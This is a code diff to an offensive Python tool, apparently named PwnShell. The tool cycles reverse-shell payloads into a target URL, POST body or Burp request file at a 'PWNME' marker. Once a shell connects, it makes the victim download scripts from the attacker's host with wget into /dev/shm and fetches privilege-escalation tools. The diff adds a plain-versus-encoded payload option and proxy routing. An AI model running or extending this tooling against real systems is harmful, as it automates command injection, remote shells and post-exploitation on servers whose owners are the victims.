@@ -33,10 +33,12 @@ class PwnShell:
 		self.type = args.type
 		self.file = args.file
 		self.nodejs = args.nodejs
+		self.payload_type=args.payload
 		self.url=None
 		self.iteration=0
 		self.listt=[]
 		self.encoded_payload=None
+		self.payload=None
 		self.connected = False
 
 		if not self.file and not self.domain:
@@ -52,10 +54,10 @@ class PwnShell:
 			print(colors.get_colored_text("[!]Invalid Value -> " + self.type +"\n\n[!]USAGE: "+sys.argv[0]+" -h\n", ColorsSet.RED))
 			exit_gracefully()
 		######################################################################
-
+	
 	def info(self):
 		self.payload_iter()
-		info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request File':self.file, '[*]Use NodeJS Payloads':self.nodejs}
+		info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]OS type ':self.type.upper(), '[*]Request File':self.file, '[*]Use NodeJS Payloads':self.nodejs,'[*]Payload Type: ':self.payload_type.upper()}
 		for key, value in info.items():
 			if value:
 				print(colors.get_colored_text(f"{key} : ", ColorsSet.ORANGE),end='')
@@ -99,7 +101,6 @@ class PwnShell:
 		print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
 		self.connected = True  #To stop the thread
 		self.for_listener()
-		time.sleep(5)
 		nc.send_line(b"export TERM=xterm-256color")
 		print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
 		send = f'''wget -q -r -P /dev/shm/  http://{self.ip}:9002/scripts/ ; clear'''
@@ -115,8 +116,12 @@ class PwnShell:
 		print("[*]CONNECTION ESTABLISHED!")
 		if self.method == "get" or self.method == "GET":
 			print("[+]Vulnerable URL:",self.url)
+			print("[+]Payload:",self.payload)
 		else:
-			print(f"[+]Payload: {self.encoded_payload}")
+			if self.payload_type == "encoded" or self.payload_type == 'ENCODED':
+				print(f"[+]Payload: {self.encoded_payload}")
+			else:
+				print(f"[+]Payload: {self.payload}")
 		print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
 		print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
 		print('[*]Cloning PrivESC Scripts From Their Repositories...')
@@ -178,19 +183,24 @@ class PwnShell:
 			for payload in payloads:
 				if self.connected:
 					return
+				self.payload=payload
 				self.encoded_payload = self.get_url_encoded_payload(payload)
 				self.iteration += 1
 				print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
 				time.sleep(2)
 				if self.is_port_in_use():
 					break
-				self.send_request()
+				self.send_request(payload)
 
 	###############################################################################################
 	###################################  Send The Request #########################################
-	def send_request(self):
+	def send_request(self,payload):
 		if self.domain:
-			self.url = self.domain.replace('PWNME',self.encoded_payload)
+			if self.payload_type == "encoded" or self.payload_type == "ENCODED":
+				self.url = self.domain.replace('PWNME',self.encoded_payload)
+			else:
+				self.url = self.domain.replace('PWNME',payload)
+
 			proxies = {'http': 'http://127.0.0.1:8080'}
 			headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
 			if self.cookie:
@@ -199,13 +209,17 @@ class PwnShell:
 				cookies = None
 			if self.method == 'post' or self.method == 'POST':
 				if self.data:
-					data_parsed = self.data.replace("PWNME", self.encoded_payload)  # Don't change
-					r = requests.post(self.url, headers=headers,cookies=cookies, verify=False)
+					if self.payload_type == "encoded" or self.payload_type == "ENCODED": #the payload encoded
+						data_parsed = self.data.replace("PWNME", self.encoded_payload)  # Don't change
+						r = requests.post(self.url, headers=headers,cookies=cookies, verify=False)
+					else:
+						data_parsed = self.data.replace("PWNME",payload)  # Don't change
+						r = requests.post(self.url, headers=headers,cookies=cookies, verify=False)
 				else:
 					data_parsed = None
-					r = requests.post(self.url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
+					r = requests.post(self.url, headers=headers, data=data_parsed,cookies=cookies,proxies=proxies, verify=False)
 			else:
-				r = requests.get(self.url, cookies=cookies, verify=False)					
+				r = requests.get(self.url,proxies=proxies ,cookies=cookies, verify=False)					
 
 	########################################################################################
 	###################################  PARSER BURPREQUEST #################################
@@ -215,23 +229,32 @@ class PwnShell:
 		for payload in payloads:
 			if self.connected:
 				return
+			self.payload=payload
 			proxies = {'http': 'http://127.0.0.1:8080'}
 			self.encoded_payload = self.get_url_encoded_payload(payload)
 			self.iteration += 1
 			print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
 			request, post_data = burpee.parse_request(self.file)  # Don't change
 			for r in request:
-				if request[r] == "PWNME":
-					request[r] = request[r].replace("PWNME", self.encoded_payload)  # THE PAYLOAD
+				if "PWNME" in request[r]:
+					if self.payload_type == "encoded" or self.payload_type == "ENCODED":
+						request[r] = request[r].replace("PWNME", self.encoded_payload)  # THE PAYLOAD encoded
+					else:
+						request[r] = request[r].replace("PWNME", payload)  # THE PAYLOAD clear plain
 				if r == "Host":
 					self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
 			self.url = self.url.replace("PWNME", self.encoded_payload)
 
 			if self.method == "post" or self.method == "POST":
 				if post_data:
-					post_data = post_data.replace("PWNME", self.encoded_payload)
-					req = requests.post(self.url, headers=request, data=post_data, verify=False)
-					time.sleep(2)
+					if self.payload_type == "encoded" or self.payload_type == "ENCODED": #The payload encoded
+						post_data = post_data.replace("PWNME", self.encoded_payload)
+						req = requests.post(self.url, headers=request, data=post_data, verify=False)
+						time.sleep(2)
+					else:
+						post_data = post_data.replace("PWNME", payload)
+						req = requests.post(self.url, headers=request, data=post_data, verify=False)
+						time.sleep(2)
 					if self.is_port_in_use():
 						break
 				else:
@@ -241,7 +264,7 @@ class PwnShell:
 						break
 
 			else:
-				req = requests.get(self.url, headers=request,verify=False)
+				req = requests.get(self.url, headers=request,proxies=proxies,verify=False)
 				time.sleep(2)
 				if self.is_port_in_use():
 					break
@@ -295,7 +318,8 @@ if __name__ == '__main__':
 			ip_address = None
 			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
 		parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
-		parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
+		parser.add_argument("-P", "--payload", help='Payload type [encoded/plain]',default='encoded')
+		parser.add_argument("-t", "--type", help='Choose OS [windows/linux]', type=str, default='linux')
 		parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
 		parser.add_argument("-f", "--file", help='Request file')
 		parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
